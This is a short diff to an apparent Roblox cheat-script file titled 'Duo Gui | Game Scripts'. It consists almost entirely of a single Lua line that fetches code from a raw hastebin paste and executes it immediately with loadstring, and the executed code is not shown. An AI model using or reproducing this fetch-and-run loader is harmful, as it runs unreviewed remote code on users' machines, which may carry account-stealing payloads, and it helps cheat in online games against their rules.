@@ -1,1 +1,3 @@
+# Duo Gui | Game Scripts 
+
 loadstring(game:HttpGet("https://hastebin.com/raw/ukuyocoqud"))()
